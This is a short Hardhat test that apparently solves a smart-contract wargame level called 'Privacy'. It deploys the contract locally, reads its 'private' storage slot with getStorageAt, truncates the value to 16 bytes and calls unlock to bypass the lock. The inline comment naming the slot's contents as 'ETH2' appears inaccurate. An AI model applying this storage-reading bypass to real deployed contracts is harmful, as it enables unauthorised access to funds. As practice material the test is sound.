const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");

describe("test", function () {
    var Privacy;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("deploy", async function () {
        const PrivacyInstance = await ethers.getContractFactory("Privacy");
        Privacy = await PrivacyInstance.deploy([
            ethers.utils.formatBytes32String("ETH1"),
            ethers.utils.formatBytes32String("ETH2"),
            ethers.utils.formatBytes32String("ETH3"),
        ]);
    });
    it("hack test", async function () {
        const r = await ethers.provider.getStorageAt(Privacy.address, 5);
        console.log(ethers.utils.parseBytes32String(r)); //ETH2
        const key = r.slice(0, 34);
        await Privacy.unlock(key);
        expect(await Privacy.locked()).to.equal(false);
    });
});
